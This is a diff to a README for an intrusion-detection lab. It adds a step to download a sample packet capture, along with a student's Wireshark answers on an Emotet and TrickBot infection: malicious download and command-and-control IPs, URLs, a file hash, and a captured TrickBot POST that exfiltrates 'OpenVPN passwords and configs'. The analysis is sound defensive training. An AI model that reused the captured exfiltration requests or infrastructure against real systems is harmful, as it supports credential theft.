@@ -9,6 +9,8 @@ sudo chown $USER:$USER playbook.yaml && \
 chmod +x playbook.yaml && \
 sudo wget "https://raw.githubusercontent.com/Nurech/hw-2-ids-lab/master/start.sh" -O start.sh && \
 sudo chown $USER:$USER start.sh && \
+sudo wget "https://github.com/Nurech/hw-2-ids-lab/raw/master/sample_traffic.pcap" -O sample_traffic.pcap && \
+sudo chown $USER:$USER sample_traffic.pcap && \
 chmod +x start.sh && \
 ./start.sh
 ```
@@ -99,15 +101,98 @@ root@ubuntu-virtual-machine:/home/ubuntu/Desktop# sudo tail -f /var/log/suricata
 10/07/2023-14:17:34.133678  [**] [1:1000001:1] Possible DDoS attack [**] [Classification: (null)] [Priority: 3] {TCP} 242.26.9.207:18026 -> 1.1.1.1:80
 ...
 ````
-
-
-#### Review the traffic in Wireshark, what do you think is the possible source of the infection?
-#### What is the IP address of the host which is the source of the infected file?
+#### Test the rule, do you see any alerts? 
+No not yet because I don't know who is the host. 
+#### Find the infected host IP address. Check the alerts in the log file and look for the IP addresses in the alerts. What is the IP address of the possible infected host?
+Host is probably the infected host ``10.20.30.101`` as it making realistic lookind DNS and HTTP requests:
+````shell
+1	0.000000	10.20.30.101	10.20.30.1	DNS	73	Standard query 0x5dd2 A ikosher.co.il
+2	0.252134	10.20.30.1	10.20.30.101	DNS	105	Standard query response 0x5dd2 A ikosher.co.il A 104.28.7.44 A 104.28.6.44
+3	0.255520	10.20.30.101	104.28.7.44	TCP	66	49677 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM
+4	0.530331	104.28.7.44	10.20.30.101	TCP	58	80 → 49677 [SYN, ACK] Seq=0 Ack=1 Win=64240 Len=0 MSS=1460
+5	0.530871	10.20.30.101	104.28.7.44	TCP	54	49677 → 80 [ACK] Seq=1 Ack=1 Win=64240 Len=0
+6	0.532518	10.20.30.101	104.28.7.44	HTTP	683	GET /discussiono/multifunctional-section/close-4hfy6o73iy-06x/383167265-j3LVOCu77d3B/ HTTP/1.1 
+````
+#### Find infected host MAC address
+````shell
+Source: HewlettP_1c:47:ae (00:08:02:1c:47:ae)
+````
 #### What is the URL requested?
+It probably started here.
+````shell
+6	0.532518	10.20.30.101	104.28.7.44	HTTP	683	GET /discussiono/multifunctional-section/close-4hfy6o73iy-06x/383167265-j3LVOCu77d3B/ HTTP/1.1 
+````
+#### Review the traffic in Wireshark, what do you think is the possible source of the infection?
+ikosher.co.il (IP: ``104.28.7.44``) and subsequent POST requests to IP addresses like ``173.231.214.60`` and ``190.6.193.152``. 
+We see HTTP POST requests to URLs like ``/wbFcaqy5zdJxDV`` and ``/v4ZuR6CnU``.
+````shell
+1	0.000000	10.20.30.101	10.20.30.1	DNS	73	Standard query 0x5dd2 A ikosher.co.il
+````
+#### What is the IP address of the host which is the source of the infected file?
+````shell
+Destination Address: 203.176.135.102
+````
+#### What is the URL requested?
+````shell
+3464	1131.464204	10.20.30.101	203.176.135.102	HTTP	264	POST /mor84/DESKTOP-83TKHSQ_W10018363.572D588D45894026346E8F90E07B31E6/81/ HTTP/1.1
+[Full request URI: http://203.176.135.102:8082/mor84/DESKTOP-83TKHSQ_W10018363.572D588D45894026346E8F90E07B31E6/90] 
+````
 #### What is the name of the downloaded file?
+````shell
+383167265-j3LVOCu77d3B
+````
 #### What is the name of the malware the host was infected with?
+````shell
+emotet
+````
+#### What is the IP address of the host which is the source of the infected file?
+````shell
+203.176.135.102
+````
 #### What is the HTTPS traffic caused by the word document Macro for the malware?
 #### Can you identify the post infection caused by Emotet?
+````shell
+507	65.215913	10.20.30.101	190.6.193.152	HTTP	841	POST /wbFcaqy5zdJxDV HTTP/1.1  (application/x-www-form-urlencoded)
+1895	226.475842	10.20.30.101	200.69.224.73	HTTP	845	POST /OwgR HTTP/1.1  (application/x-www-form-urlencoded)
+````
 #### Can you identify the post infection caused by TrickBot?
-#### What are the hosts that malicious files have been downloaded from?
+````shell
+POST /mor84/DESKTOP-83TKHSQ_W10018363.572D588D45894026346E8F90E07B31E6/81/ HTTP/1.1
+Accept: */*
+Content-Type: multipart/form-data; boundary=---------SEPEGOULLQWDBCNV
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
+Host: 203.176.135.102:8082
+Content-Length: 219
+Connection: Close
+Cache-Control: no-cache
+
+-----------SEPEGOULLQWDBCNV
+Content-Disposition: form-data; name="data"
+
+
+
+-----------SEPEGOULLQWDBCNV
+Content-Disposition: form-data; name="source"
+
+OpenVPN passwords and configs
+-----------SEPEGOULLQWDBCNV--
+HTTP/1.1 200 OK
+connection: close
+server: Cowboy
+date: Mon, 27 Jan 2020 21:10:59 GMT
+content-length: 3
+Content-Type: text/plain
+
+/1/
+````
+#### What are the hosts that malicious files have been downloaded from? 
+````shell
+203.176.135.102
+190.214.13.2
+104.28.7.44
+````
 #### What are the malicious files SHA256 checksum?
+````shell
+383167265-j3LVOCu77d3B 	
+c963c83bc1fa7d5378c453463ce990d85858b7f96c08e9012a7ad72ea063f31e
+````
